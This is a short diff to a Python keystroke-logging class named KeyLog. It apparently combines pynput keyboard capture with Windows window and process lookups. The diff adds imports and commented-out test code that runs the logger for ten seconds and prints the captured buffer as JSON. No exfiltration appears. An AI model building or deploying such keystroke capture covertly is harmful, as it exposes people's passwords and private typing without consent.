@@ -1,11 +1,11 @@
 import threading
 from pynput import keyboard 
 import time
+import json
+from copy import deepcopy
 import psutil
 import win32gui
 import win32process
-
-
 
 class KeyLog():
     def __init__(self):
@@ -62,3 +62,11 @@ class KeyLog():
     def drain(self):
         temp, self.buffer = self.buffer, []
         return temp
+
+# log1 = KeyLog()
+# log1.start()
+# time.sleep(10)
+# log1.stop()
+
+# data = log1.drain()
+# print(json.dumps(data, indent = 2))
